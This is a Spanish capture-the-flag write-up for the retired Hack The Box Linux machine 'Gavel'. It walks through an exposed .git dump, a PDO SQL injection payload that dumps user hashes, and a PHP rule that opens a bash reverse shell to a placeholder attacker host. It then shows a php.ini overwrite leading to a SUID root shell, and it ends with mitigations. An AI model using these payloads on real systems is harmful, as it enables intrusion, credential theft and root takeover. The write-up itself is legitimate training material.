---
machine: Gavel
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, web, git, sqli, php, privesc]
---

# Gavel — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

El repositorio `.git` expuesto revela una aplicación PHP de subastas. `inventory.php` concatena el parámetro `sort` en una consulta preparada, lo que permite una inyección PDO con `?` extra. Se vuelca el hash bcrypt de `auctioneer`, se entra al panel y se edita la regla PHP de una subasta ejecutada con `runkit_function_add`, logrando RCE. `gavel-util` valida reglas con un `php.ini` restrictivo, pero `file_put_contents` permite sobrescribirlo y ejecutar `system` como root.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,80 <IP>
```

- `22/tcp` OpenSSH y `80/tcp` nginx con una casa de subastas.
- `git-dumper http://gavel.htb/.git src/` recupera el repositorio.
- El código muestra PHP, PDO/MySQL y reglas de subasta en YAML.

## Enumeración

- `inventory.php` usa `$col = "`" . str_replace("`", "", $sort) . "`"` dentro de la consulta.
- El parámetro `user_id` también es controlable, lo que permite un IDOR.
- `auctioneer` es el único usuario con rol administrador.

## Foothold

Se inyecta un `?` en `sort` para desplazar el placeholder de PDO y se usa `user_id` para cerrar la consulta. Así se enumeran tablas y se vuelca `username:password:role`.

```bash
curl 'http://gavel.htb/inventory.php?sort=%3F;--+-&user_id=x`+FROM+(SELECT+concat(username,0x3a,password,0x3a,role)+AS+`%27x`+FROM+users)y;--+-'
```

El hash bcrypt de `auctioneer` se crackea y se entra al panel.

## Movimiento lateral

El panel permite editar la regla PHP de una subasta. `bid_handler.php` carga esa regla con `runkit_function_add` y la ejecuta al pujar. Una regla con `system()` lanza una reverse shell como `www-data`.

```php
system('bash -c "bash -i >& /dev/tcp/<ATTACKER>/443 0>&1"'); return true;
```

## Escalada de privilegios

`auctioneer` puede ejecutar `gavel-util submit`. La herramienta valida la regla con PHP y un `php.ini` que bloquea `system`, pero `file_put_contents` sigue disponible. Se sobrescribe el `php.ini` para permitir `system` y se envía una segunda regla que crea una bash SUID.

```php
<?php
file_put_contents('/opt/gavel/.config/php/php.ini', "engine=On\nopen_basedir=\ndisable_functions=\n");
return false;
```

```yaml
rule: "system('cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash'); return false;"
```

## Evidencia

- `.git` recuperado y código de `inventory.php`.
- Inyección PDO y hash bcrypt crackeado.
- Regla PHP ejecutada con `runkit`.
- `php.ini` sobrescrito y bash SUID como root.

## Lecciones aprendidas

- Concatenar un identificador en una consulta preparada puede romper PDO.
- Ejecutar reglas PHP de la base es ejecución de código por diseño.
- Un sandbox que permite escribir su propia configuración no es un sandbox.

## Mitigación y detección

- Validar `sort` contra una lista blanca de columnas.
- No cargar código PHP desde la base; usar reglas declarativas.
- Montar el `php.ini` como solo lectura y ejecutar la validación sin privilegios.

## Referencias

- [0xdf — Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [IppSec — Gavel](https://www.youtube.com/watch?v=OwcHZag2trY)
- [Hack The Box — Gavel](https://app.hackthebox.com/machines/gavel)
